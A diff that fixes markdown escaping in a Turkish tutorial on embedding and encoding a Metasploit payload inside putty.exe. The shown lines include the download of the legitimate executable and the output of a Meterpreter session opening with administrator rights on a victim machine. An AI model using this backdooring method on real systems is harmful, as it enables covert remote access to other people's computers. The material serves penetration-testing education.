@@ -41,14 +41,14 @@ Bu yazıda, bir .exe dosyasının içine, Metasploit Payload yerleştirip encode
 root@kali:/var/www# wget <a href="http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe">http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe</a>
 --2015-07-21 12:01:27--  <a href="http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe">http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe</a>
 
-Resolving the.earth.li **(**the.earth.li**)**... 46.43.34.31, 2001:41c8:10:b1f:c0ff:ee:15:900d
-Connecting to the.earth.li **(**the.earth.li**)**|46.43.34.31|:80... connected.
+Resolving the.earth.li (the.earth.li)... 46.43.34.31, 2001:41c8:10:b1f:c0ff:ee:15:900d
+Connecting to the.earth.li (the.earth.li)|46.43.34.31|:80... connected.
 HTTP request sent, awaiting response... 302 Found
 Location: <a href="http://the.earth.li/~sgtatham/putty/0.64/x86/putty.exe">http://the.earth.li/~sgtatham/putty/0.64/x86/putty.exe</a> **[**following]
 --2015-07-21 12:01:27--  <a href="http://the.earth.li/~sgtatham/putty/0.64/x86/putty.exe">http://the.earth.li/~sgtatham/putty/0.64/x86/putty.exe</a>
 Reusing existing connection to the.earth.li:80.
 HTTP request sent, awaiting response... 200 OK
-Length: 524288 **(**512K**)** **[**application/x-msdos-program]
+Length: 524288 (512K) **[**application/x-msdos-program]
 Saving to: `putty.exe'
 
 100%[=========================================================================================================>] 524,288      815K/s   in 0.6s    
@@ -107,8 +107,8 @@ Artık dinleme modülü de çalışmaktadır. Bu aşamadan sonra yapılması ger
 
 
 ```bash
-> Sending stage **(**749056 bytes**)** to 192.168.1.201
-> Meterpreter session 1 opened **(**192.168.1.101:443 -> 192.168.1.201:1189**)** at Sat Feb 05 08:54:25 -0700 2011
+> Sending stage (749056 bytes) to 192.168.1.201
+> Meterpreter session 1 opened (192.168.1.101:443 -> 192.168.1.201:1189) at Sat Feb 05 08:54:25 -0700 2011
 
 meterpreter > getuid
 Server username: XEN-XP-SPLOIT\Administrator
